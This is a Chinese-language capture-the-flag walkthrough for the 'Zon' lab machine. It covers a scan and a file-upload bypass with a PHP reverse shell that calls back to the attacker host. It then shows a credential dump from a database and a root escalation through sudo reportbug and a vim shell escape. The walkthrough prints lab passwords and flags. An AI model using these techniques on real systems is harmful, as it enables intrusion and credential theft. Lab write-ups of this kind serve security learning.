# Zon

> 本题最好桥接，校园网的化用手机热点桥接

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011445097.png" alt="image-20240401133315374" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011445099.png" alt="image-20240401133419388" style="zoom:50%;" />

一看扫的就不对，尝试切换为NAT网卡，重新扫一下，也可以换热点继续桥接扫，但是我是懒p。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011445100.png" alt="image-20240401133628658" style="zoom:50%;" />

对胃了！

## 信息搜集

### 端口扫描

```bash
rustscan -a 10.0.2.16 -- -A
```

> 之前都写错了，`-A`后面还加了参数，其实这里的`-A`，对应的是`nmap`的`-A`，我一直以为这个是`rustscan`移交控制权的参数呢。

```css
Open 10.0.2.16:22
Open 10.0.2.16:80
```

```css
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
80/tcp open  http    syn-ack Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: zon
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
feroxbuster -u http://10.0.2.16
```

```CSS
301      GET        9l       28w      307c http://10.0.2.16/images => http://10.0.2.16/images/
301      GET        9l       28w      304c http://10.0.2.16/css => http://10.0.2.16/css/
301      GET        9l       28w      308c http://10.0.2.16/uploads => http://10.0.2.16/uploads/
301      GET        9l       28w      306c http://10.0.2.16/fonts => http://10.0.2.16/fonts/
200      GET      405l     2619w   206407c http://10.0.2.16/images/ser_img3.png
200      GET     1452l     5977w   212322c http://10.0.2.16/fonts/fontawesome-webfont.ttf
200      GET      823l     4393w   196808c http://10.0.2.16/fonts/Poppins-BoldItalic.ttf
301      GET        9l       28w      305c http://10.0.2.16/icon => http://10.0.2.16/icon/
301      GET        9l       28w      303c http://10.0.2.16/js => http://10.0.2.16/js/
200      GET      153l      449w     4306c http://10.0.2.16/js/custom.js
200      GET        7l      896w    70808c http://10.0.2.16/js/bootstrap.bundle.min.js
200      GET     2492l    14276w  1161727c http://10.0.2.16/images/coff_img.png
200      GET     6433l    20653w   210612c http://10.0.2.16/js/bootstrap.bundle.js
200      GET      936l     5441w   417516c http://10.0.2.16/images/blog1.jpg
200      GET      846l     5909w   499091c http://10.0.2.16/images/blog2.jpg
200      GET        3l       44w     1167c http://10.0.2.16/images/menu_icon.png
200      GET      158l      967w    79372c http://10.0.2.16/images/footer_af.png
200      GET      342l     1878w   139839c http://10.0.2.16/images/footer_be.png
200      GET     1197l     2079w    21393c http://10.0.2.16/css/style.css
200      GET      269l     1633w   128756c http://10.0.2.16/images/ser_img2.png
200      GET      614l     1238w    11416c http://10.0.2.16/css/default-skin.css
200      GET      443l     2610w   197291c http://10.0.2.16/images/ser_img1.png
200      GET      242l     1313w    65160c http://10.0.2.16/images/loading.gif
200      GET       62l      404w    31130c http://10.0.2.16/images/test_pro.jpg
200      GET     3615l    22189w  1818685c http://10.0.2.16/images/about.png
200      GET      294l     1613w   122935c http://10.0.2.16/images/coff.png
200      GET        5l     1287w    87088c http://10.0.2.16/js/jquery.min.js
200      GET        5l      478w    45479c http://10.0.2.16/js/jquery.mCustomScrollbar.concat.min.js
200      GET      304l      604w     6678c http://10.0.2.16/css/responsive.css
200      GET        7l      277w    44342c http://10.0.2.16/js/owl.carousel.min.js
200      GET        6l       77w     3351c http://10.0.2.16/css/owl.carousel.min.css
200      GET        7l     1604w   140421c http://10.0.2.16/css/bootstrap.min.css
200      GET      213l     1380w    11324c http://10.0.2.16/js/jquery-3.0.0.min.js
200      GET        1l      870w    42839c http://10.0.2.16/css/jquery.mCustomScrollbar.min.css
200      GET      373l     1987w   186433c http://10.0.2.16/fonts/Poppins-Thin.ttf
200      GET      259l     1703w   182124c http://10.0.2.16/fonts/Poppins-Regular.ttf
200      GET      392l     2209w   177523c http://10.0.2.16/fonts/fontawesome-webfont.woff
200      GET      288l     1759w   139600c http://10.0.2.16/fonts/fontawesome-webfont.woff2
200      GET      620l     5062w   200792c http://10.0.2.16/fonts/Poppins-Italic.ttf
200      GET      260l     1915w   178138c http://10.0.2.16/fonts/Poppins-SemiBold.ttf
200      GET      511l     1445w    29170c http://10.0.2.16/
200      GET      623l     4094w   197884c http://10.0.2.16/fonts/Poppins-MediumItalic.ttf
200      GET      667l     4170w   204813c http://10.0.2.16/fonts/Poppins-ExtraLightItalic.ttf
200      GET      353l     2394w   176854c http://10.0.2.16/fonts/Poppins-Black.ttf
200      GET      845l     4921w   158169c http://10.0.2.16/fonts/IcoMoon-Free.ttf
200      GET     1452l     5979w   212524c http://10.0.2.16/fonts/fontawesome-webfont.eot
200      GET      257l     2142w   178822c http://10.0.2.16/fonts/Poppins-ExtraBold.ttf
200      GET        7l      570w    50676c http://10.0.2.16/js/bootstrap.min.js
200      GET      105l      230w     2716c http://10.0.2.16/js/slider-setting.js
200      GET      723l     4178w   206437c http://10.0.2.16/fonts/Poppins-ThinItalic.ttf
200      GET        6l      352w    19190c http://10.0.2.16/js/popper.min.js
200      GET       30l      170w     3969c http://10.0.2.16/js/revolution/assets/loader.gif
200      GET        3l       40w      957c http://10.0.2.16/js/revolution/assets/gridtile_white.png
200      GET        3l       38w      966c http://10.0.2.16/js/revolution/assets/gridtile_3x3_white.png
200      GET        3l       39w      963c http://10.0.2.16/js/revolution/assets/gridtile.png
200      GET        3l       37w      976c http://10.0.2.16/js/revolution/assets/gridtile_3x3.png
200      GET      773l     4356w   195244c http://10.0.2.16/fonts/Poppins-ExtraBoldItalic.ttf
200      GET        8l      608w    62649c http://10.0.2.16/js/revolution/js/jquery.themepunch.revolution.min.js
200      GET      136l     1626w   107075c http://10.0.2.16/js/revolution/js/jquery.themepunch.tools.min.js
200      GET     1151l     5151w   202793c http://10.0.2.16/fonts/Poppins-LightItalic.ttf
200      GET      281l     1994w   180221c http://10.0.2.16/fonts/Poppins-Bold.ttf
200      GET      307l     1670w   178862c http://10.0.2.16/fonts/Poppins-Medium.ttf
200      GET      563l     4120w   191994c http://10.0.2.16/fonts/Poppins-BlackItalic.ttf
200      GET      177l      358w     3653c http://10.0.2.16/css/nice-select.css
200      GET      358l     1712w   185187c http://10.0.2.16/fonts/Poppins-ExtraLight.ttf
200      GET      108l      179w     1884c http://10.0.2.16/css/slick.css
200      GET        1l      158w    14143c http://10.0.2.16/css/jquery.fancybox.min.css
200      GET        2l      433w    53678c http://10.0.2.16/css/animate.min.css
200      GET     2671l    62869w   444379c http://10.0.2.16/fonts/fontawesome-webfont.svg
200      GET     8950l    17395w   172839c http://10.0.2.16/css/bootstrap.css
200      GET        4l       66w    31000c http://10.0.2.16/css/font-awesome.min.css
200      GET     2574l     4782w   258854c http://10.0.2.16/fonts/FontAwesome.otf
200      GET      806l     4004w   195419c http://10.0.2.16/fonts/Poppins-SemiBoldItalic.ttf
200      GET      262l     1711w   183624c http://10.0.2.16/fonts/Poppins-Light.ttf
200      GET        3l        9w      224c http://10.0.2.16/js/revolution/assets/coloredbg.png
200      GET        1l        4w      586c http://10.0.2.16/js/revolution/css/closedhand.html
200      GET     5798l    11097w   140645c http://10.0.2.16/js/revolution/css/layers.css
200      GET     2637l     4520w    59474c http://10.0.2.16/js/revolution/css/navigation.css
200      GET        1l        5w      582c http://10.0.2.16/js/revolution/css/openhand.html
200      GET        7l      443w    29490c http://10.0.2.16/js/revolution/css/settings.css
```

## 漏洞挖掘

### 访问敏感目录

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011445101.png" alt="image-20240401134414023" style="zoom:33%;" />

加载资源慢到离谱，可能需要请求其他的网站资源，切换热点，桥接。。。

```bash
# kali
172.20.10.8
# Zon
172.20.10.12
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011445102.png" alt="image-20240401135135873" style="zoom: 50%;" />

访问一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011445103.png" alt="image-20240401135224091" style="zoom: 25%;" />

查看敏感目录，但是没啥发现。

### 二次信息搜集

```bash
gobuster dir -u http://172.20.10.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html.png,jpg,zip
```

```text
/.html.png            (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 29170]
/images               (Status: 301) [Size: 313] [--> http://172.20.10.12/images/]
/.php                 (Status: 403) [Size: 277]
/about.php            (Status: 200) [Size: 10538]
/contact.php          (Status: 200) [Size: 11753]
/blog.php             (Status: 200) [Size: 12490]
/uploads              (Status: 301) [Size: 314] [--> http://172.20.10.12/uploads/]
/upload.php           (Status: 500) [Size: 0]
/service.php          (Status: 200) [Size: 12239]
/report.php           (Status: 200) [Size: 13]
/icon                 (Status: 301) [Size: 311] [--> http://172.20.10.12/icon/]
/css                  (Status: 301) [Size: 310] [--> http://172.20.10.12/css/]
/js                   (Status: 301) [Size: 309] [--> http://172.20.10.12/js/]
/fonts                (Status: 301) [Size: 312] [--> http://172.20.10.12/fonts/]
/choose.php           (Status: 200) [Size: 1908]
/testimonial.php      (Status: 200) [Size: 17014]
/.php                 (Status: 403) [Size: 277]
/.html.png            (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
```

继续查看一下敏感目录：

```apl
/choose.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011445104.png" alt="image-20240401140127627" style="zoom:50%;" />

### 文件上传

有个上传`包含jpeg的zip`的地方，构造一下：

```bash
head revershell.php  

  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '172.20.10.8';  // You have changed this
  $port = 1234;  // And this
  $chunk_size = 1400;
```

将其重命名并压缩提交：

```bash
revershell.jpeg.php
revershell.php%00.jpeg
revershell.jpeg .php
```

最后一个成功了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011445105.png" alt="image-20240401142516477" style="zoom: 50%;" />

## 提权

### 信息搜集

```css
(remote) www-data@zon:/$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(remote) www-data@zon:/$ pwd
/
(remote) www-data@zon:/$ ls
bin   dev  home        initrd.img.old  lib32  libx32      media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lib64  lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
(remote) www-data@zon:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/sbin/pppd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
(remote) www-data@zon:/$ cd /var/www/html
(remote) www-data@zon:/var/www/html$ ls
about.php  choose.php   css    hashDB.sh  images     js          service.php      upload.php
blog.php   contact.php  fonts  icon       index.php  report.php  testimonial.php  uploads
(remote) www-data@zon:/var/www/html$ cat hashDB.sh 
#!/bin/bash

# script that checks the database's integrity every minute

dump=/dev/shm/dump.sql
log=/var/log/db_integrity_check.log
true > "${log}"

/usr/bin/mysqldump -u admin -pudgrJbFc6Av#U3 admin credentials > "${dump}"
/usr/bin/sed -i '$d' "${dump}"

hash="29d8e6b76aab0254f7fe439a6a5d2fba64270dde087e6dfab57fa57f6749858a"
check_hash=$(sha256sum "${dump}" | awk '{print $1}')

if [[ "${hash}" != "${check_hash}" ]] ; then
  /usr/bin/wall "Alert ! Database hacked !"
  /usr/bin/du -sh /var/lib/mysql >> "${log}"
  /usr/bin/vmstat 1 3 >> "${log}"
else
  /usr/bin/sync && /usr/bin/echo 3 > /proc/sys/vm/drop_caches
  /usr/bin/echo "$(date) : Integrity check completed for ${dump}" >> "${log}"
fi
```

得到数据库账号密码：

```apl
admin
udgrJbFc6Av#U3
```

### 连接数据库

```bash
mysql -u admin -p
```

```css
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| admin              |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.041 sec)

MariaDB [(none)]> use admin;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [admin]> show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| credentials     |
+-----------------+
1 row in set (0.000 sec)

MariaDB [admin]> select * from credentials;
+----------+-------------------------+
| username | password                |
+----------+-------------------------+
| Freddie  | LDVK@dYiEa2I1lnjrEeoMif |
+----------+-------------------------+
1 row in set (0.000 sec)
```

### ssh登录Freddie

疑似得到了一个用户，查看一下是否有这个用户：

```css
cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:103:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
mysql:x:104:112:MySQL Server,,,:/nonexistent:/bin/false
Debian-snmp:x:105:113::/var/lib/snmp:/bin/false
freddie:x:1000:1000:,,,:/home/freddie:/bin/zsh
```

真的有，尝试ssh连接：

```apl
Freddie
LDVK@dYiEa2I1lnjrEeoMif
```

```bash
ssh freddie@172.20.10.12
```

### 信息搜集

```bash
╭─freddie@zon ~ 
╰─$ whoami;id
freddie
uid=1000(freddie) gid=1000(freddie) groups=1000(freddie),100(users)
╭─freddie@zon ~ 
╰─$ ls -la
total 44
drwx------  4 freddie freddie 4096 Apr  1 08:35 .
drwxr-xr-x  3 root    root    4096 Nov 27 20:22 ..
lrwxrwxrwx  1 root    root       9 Dec  3 10:46 .bash_history -> /dev/null
-rw-r--r--  1 freddie freddie  220 Nov 27 20:22 .bash_logout
-rw-r--r--  1 freddie freddie 3526 Nov 27 20:22 .bashrc
drwxr-xr-x  3 freddie freddie 4096 Dec  1 21:06 .local
drwxr-xr-x 12 freddie freddie 4096 Apr  1 08:34 .oh-my-zsh
-rw-r--r--  1 freddie freddie  807 Nov 27 20:22 .profile
-rwx------  1 freddie freddie   33 Nov 30 07:21 user.txt
-rw-r--r--  1 freddie freddie  169 Apr  1 08:34 .wget-hsts
-rw-------  1 freddie freddie   22 Apr  1 08:35 .zsh_history
-rw-r--r--  1 freddie freddie 3890 Nov 27 20:22 .zshrc
╭─freddie@zon ~ 
╰─$ cat user.txt
a0b4603c7fde7e4113d2ee5fbee5a038
╭─freddie@zon ~ 
╰─$ sudo -l
sudo: unable to resolve host zon: Name or service not known
Matching Defaults entries for freddie on zon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User freddie may run the following commands on zon:
    (ALL : ALL) NOPASSWD: /usr/bin/reportbug
```

打开看一会发现是非常长非常长的python脚本，直接运行一下试试：

```bash
sudo /usr/bin/reportbug
```

瞎点几次会来到这：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011445106.png" alt="image-20240401144409120" style="zoom: 50%;" />

在vim中输入`!/bin/bash`即可完成提权

```css
Select an editor.  To change later, run 'select-editor'.
  1. /bin/nano        <---- easiest
  2. /usr/bin/vim.tiny

Choose 1-2 [1]: 2

root@zon:/tmp# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
root@zon:/tmp# cd /root
root@zon:~# ls
root.txt
root@zon:~# cat root.txt
18a72aa09ce61fb487fd6745c8eba769
```

